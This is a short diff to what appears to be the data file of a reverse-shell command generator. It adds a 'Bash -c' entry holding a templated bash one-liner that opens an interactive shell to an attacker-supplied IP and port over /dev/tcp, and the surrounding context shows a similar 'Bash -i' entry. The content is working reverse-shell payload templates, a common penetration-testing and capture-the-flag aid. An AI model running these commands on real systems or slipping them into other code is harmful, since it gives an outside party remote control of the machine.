@@ -21,6 +21,11 @@ const withCommandType = function (commandType, elements) {
 const reverseShellCommands = withCommandType(
     CommandType.ReverseShell,
     [
+	{
+            "name": "Bash -c",
+            "command": "bash -c \"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1\"",
+            "meta": ["linux", "mac"]
+        },
         {
             "name": "Bash -i",
             "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
